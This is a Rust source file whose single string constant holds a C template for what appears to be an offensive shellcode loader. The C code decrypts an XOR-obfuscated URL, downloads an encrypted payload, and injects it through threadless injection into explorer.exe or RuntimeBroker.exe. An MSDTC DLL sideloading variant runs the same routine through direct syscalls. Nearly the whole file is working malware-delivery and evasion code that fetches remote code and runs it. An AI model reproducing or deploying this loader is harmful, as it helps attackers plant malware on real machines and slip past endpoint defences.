pub const MAIN_C: &str = r#"#include <windows.h>
#include "macros.h"
#include "web.h"
#include "winapi.h"

#ifdef MSDTC_DLL_SIDELOAD
#include "msdtc_dll_sideload.h"
#endif

#ifdef THREADLESS_INJECTION
#include "threadless_injection.h"
#endif

/* the kann shellcode file */
#include "./method/kannshellcode.c"

/* encrypt url array */
unsigned char Url[] = {{ENC_URL}};

extern NT_CONFIG g_NT_CONFIG;
extern NT_API g_NT_API;

#ifdef DEBUG
void hexdump(const unsigned char *data, size_t size);
#endif

/* THREADLESS INJECTION */
#ifdef THREADLESS_INJECTION
int Main() {

    GetKey();

    if (!InitNtdllConfig()) {
#ifdef DEBUG
        PRINTA("[-] INIT NTDLL.dll Error!\n");
#endif
        return 1;
    }

#ifdef DEBUG
    PRINTA("[+] ntdll number of names : %d\n", g_NT_CONFIG.dwNumberOfNames);
    PRINTA("[+] ntdll address : %p\n", g_NT_CONFIG.uModule);
#endif

    char *File = NULL;
    int Size;

    Xoor(Url, sizeof(Url));
#ifdef DEBUG
    hexdump(Url, sizeof(Url));
#endif

    if (!Download((char *)Url, &File, &Size)) {
#ifdef DEBUG
        PRINTA("[-] Failed to Download\n");
#endif
        return 0;
    };

    Xoor(File, Size);

    PTHREADLESSCONFIG pThreadlessConfig = malloc(sizeof(THREADLESSCONFIG));
    TARGETFUNCTIONCONFIG TargetFunctionConfig[1];
#ifdef REMOTE
    LoadTargetFunctionConfig(&TargetFunctionConfig[0], EXPLORER_EXE_HASH,
                             RtlNtStatusToDosError_Hash, NTDLL_DLL_HASH,
                             NtCreateWnfStateName_Hash, NTDLL_DLL_HASH, Size,
                             sizeof(KannShellcode));
#endif
#ifdef LOCAL
    LoadTargetFunctionConfig(&TargetFunctionConfig[0], RUNTIMEBROKER_EXE_HASH,
                             RtlAcquireSRWLockExclusive_Hash, NTDLL_DLL_HASH,
                             NtCreateWnfStateName_Hash, NTDLL_DLL_HASH, Size,
                             sizeof(KannShellcode));
#endif
    pThreadlessConfig->pMainBuffer = File;

    DWORD dwTargetFunctionConfigCount =
        sizeof(TargetFunctionConfig) / sizeof(TargetFunctionConfig[0]);

    for (int i = 0; i < dwTargetFunctionConfigCount; i++) {
        if (CheckTargetFunctionConfig(&TargetFunctionConfig[i],
                                      pThreadlessConfig)) {

            pThreadlessConfig->pKannBuffer = malloc(sizeof(KannShellcode));
            memcpy((void *)pThreadlessConfig->pKannBuffer, KannShellcode,
                   sizeof(KannShellcode));
#ifdef DEBUG
            PRINTA("[+] Threadless Config hProcess: %d\n",
                   pThreadlessConfig->hProcess);
            PRINTA("[+] Threadless Config pKannBuffer: %p\n",
                   pThreadlessConfig->pKannBuffer);
            PRINTA("[+] Threadless Config pMainBuffer: %p\n",
                   pThreadlessConfig->pMainBuffer);
            PRINTA("[+] Threadless Config pHookedFunction: %p\n",
                   pThreadlessConfig->pHookedFunction);
            PRINTA("[+] Threadless Config pMainMemoryHole: %p\n",
                   pThreadlessConfig->pMainMemoryHole);
            PRINTA("[+] Threadless Config pKannMemoryHole: %p\n",
                   pThreadlessConfig->pKannMemoryHole);
            PRINTA("[+] Threadless Config dwMainBufferSize: %d\n",
                   pThreadlessConfig->dwMainBufferSize);
            PRINTA("[+] Threadless Config dwKannBufferSize: %d\n",
                   pThreadlessConfig->dwKannBufferSize);
#endif

            if (Launch(pThreadlessConfig)) {
                memset(pThreadlessConfig->pKannBuffer, 0,
                       sizeof(KannShellcode));
                free(pThreadlessConfig->pKannBuffer);
                break;
            };
#ifdef DEBUG
            PRINTA("<-> Configure %i launch failed, try next configure...hope "
                   "everything is under control...\n",
                   i);
#endif

            memset(pThreadlessConfig->pKannBuffer, 0, sizeof(KannShellcode));
            free(pThreadlessConfig->pKannBuffer);
        }
    }
    memset(pThreadlessConfig, 0, sizeof(THREADLESSCONFIG));
    return 0;
}
#endif




/* MSDTC SIDELOAD MSDTCTM.DLL */

#ifdef MSDTC_DLL_SIDELOAD
int RunMain();
extern __declspec(dllexport) PVOID DtcMainExt() {
    if (!InitNtdllConfig()) {
#ifdef DEBUG
        PRINTA("[-] INIT NTDLL.dll Error!\n");
#endif
        return 1;
    }
    if (!InitNtSyscall(&g_NT_CONFIG, NtAllocateVirtualMemory_Hash,
                       S_PTR(NT_SYSCALL, g_NT_API.NtAllocateVirtualMemory)) ||
        !InitNtSyscall(&g_NT_CONFIG, NtProtectVirtualMemory_Hash,
                       S_PTR(NT_SYSCALL, g_NT_API.NtProtectVirtualMemory)) ||
        !InitNtSyscall(&g_NT_CONFIG, NtCreateThreadEx_Hash,
                       S_PTR(NT_SYSCALL, g_NT_API.NtCreateThreadEx)))
        return 0;
    HANDLE hThread = NULL;
    CONFIGURE_SYSCALL(g_NT_API.NtCreateThreadEx);
    if (SysCall(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), RunMain,
                NULL, FALSE, NULL, NULL, NULL, NULL))
        return 0;
    WaitForSingleObject(hThread, INFINITE);
    return NULL;
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
int RunMain() {

    GetKey();

    if (!InitNtdllConfig()) {
#ifdef DEBUG
        PRINTA("[-] INIT NTDLL.dll Error!\n");
#endif
        return 1;
    }

#ifdef DEBUG
    PRINTA("[+] ntdll number of names : %d\n", g_NT_CONFIG.dwNumberOfNames);
    PRINTA("[+] ntdll address : %p\n", g_NT_CONFIG.uModule);
#endif

    char *File = NULL;
    int Size;

    Xoor(Url, sizeof(Url));
#ifdef DEBUG
    hexdump(Url, sizeof(Url));
#endif

    if (!Download((char *)Url, &File, &Size)) {
#ifdef DEBUG
        PRINTA("[-] Failed to Download\n");
#endif
        return 0;
    };

    Xoor(File, Size);

    PTHREADLESSCONFIG pThreadlessConfig = malloc(sizeof(THREADLESSCONFIG));
    TARGETFUNCTIONCONFIG TargetFunctionConfig[1];

    LoadTargetFunctionConfig(&TargetFunctionConfig[0], RUNTIMEBROKER_EXE_HASH,
                             RtlAcquireSRWLockExclusive_Hash, NTDLL_DLL_HASH,
                             NtCreateWnfStateName_Hash, NTDLL_DLL_HASH, Size,
                             sizeof(KannShellcode));

    pThreadlessConfig->pMainBuffer = File;

    DWORD dwTargetFunctionConfigCount =
        sizeof(TargetFunctionConfig) / sizeof(TargetFunctionConfig[0]);

    for (int i = 0; i < dwTargetFunctionConfigCount; i++) {
        if (CheckTargetFunctionConfig(&TargetFunctionConfig[i],
                                      pThreadlessConfig)) {

            pThreadlessConfig->pKannBuffer = malloc(sizeof(KannShellcode));
            memcpy((void *)pThreadlessConfig->pKannBuffer, KannShellcode,
                   sizeof(KannShellcode));
#ifdef DEBUG
            PRINTA("[+] Threadless Config hProcess: %d\n",
                   pThreadlessConfig->hProcess);
            PRINTA("[+] Threadless Config pKannBuffer: %p\n",
                   pThreadlessConfig->pKannBuffer);
            PRINTA("[+] Threadless Config pMainBuffer: %p\n",
                   pThreadlessConfig->pMainBuffer);
            PRINTA("[+] Threadless Config pHookedFunction: %p\n",
                   pThreadlessConfig->pHookedFunction);
            PRINTA("[+] Threadless Config pMainMemoryHole: %p\n",
                   pThreadlessConfig->pMainMemoryHole);
            PRINTA("[+] Threadless Config pKannMemoryHole: %p\n",
                   pThreadlessConfig->pKannMemoryHole);
            PRINTA("[+] Threadless Config dwMainBufferSize: %d\n",
                   pThreadlessConfig->dwMainBufferSize);
            PRINTA("[+] Threadless Config dwKannBufferSize: %d\n",
                   pThreadlessConfig->dwKannBufferSize);
#endif

            if (Launch(pThreadlessConfig)) {
                memset(pThreadlessConfig->pKannBuffer, 0,
                       sizeof(KannShellcode));
                free(pThreadlessConfig->pKannBuffer);
                break;
            };
#ifdef DEBUG
            PRINTA("<-> Configure %i launch failed, try next configure...hope "
                   "everything is under control...\n",
                   i);
#endif

            memset(pThreadlessConfig->pKannBuffer, 0, sizeof(KannShellcode));
            free(pThreadlessConfig->pKannBuffer);
        }
    }
    memset(pThreadlessConfig, 0, sizeof(THREADLESSCONFIG));
    return 0;
}
#endif


#ifdef DEBUG
void hexdump(const unsigned char *data, size_t size) {
    size_t i, j;

    for (i = 0; i < size; i += 16) {
        PRINTA("%08lx: ", (unsigned long)i);

        for (j = 0; j < 16; j++) {
            if (i + j < size) {
                PRINTA("%02x ", data[i + j]);
            } else {
                PRINTA("   ");
            }
        }

        PRINTA(" | ");
        for (j = 0; j < 16; j++) {
            if (i + j < size) {
                if (data[i + j] >= 32 && data[i + j] <= 126) {
                    PRINTA("%c", data[i + j]);
                } else {
                    PRINTA(".");
                }
            } else {
                PRINTA(" ");
            }
        }

        PRINTA("\n");
    }
};
#endif

"#;
